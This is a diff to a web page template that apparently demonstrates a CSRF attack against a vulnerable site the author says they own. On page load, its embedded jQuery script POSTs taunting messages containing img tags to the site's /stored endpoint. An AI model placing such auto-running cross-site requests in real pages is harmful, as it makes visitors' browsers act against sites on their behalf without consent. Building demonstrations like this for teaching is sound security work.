@@ -5,10 +5,20 @@ layout: just-analytics
 <!-- This executes a CSRF Attack against vcwa.veryveryvulnerable.com, a site I also own -->
 <script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
 <script>
+	function getMessage() {
+		var options = [
+			'im in ur users browser, making POST requests to ur site', 
+			'Blowing up your site like <img src="http://i.imgur.com/Q0HCU.gif"/>', 
+			'You think this is secure? <img src="https://i.imgur.com/l6qBUqu.png"/>', 
+			'Let us see what other vulnerabilities we can find... <img src="https://media.giphy.com/media/10gZNwuUuer5aU/200w_d.gif"/>', 
+		];
+		return options[Math.floor(Math.random() * options.length)]
+	}
+
 	console.log('muahaha...');
 	$.post(
 		'http://vcwa.veryveryvulnerable.com/stored',
-		{message: 'POST with any payload the attacker wants... on behalf of a real user...'}
+		{message: getMessage()}
 	);
 </script>
 
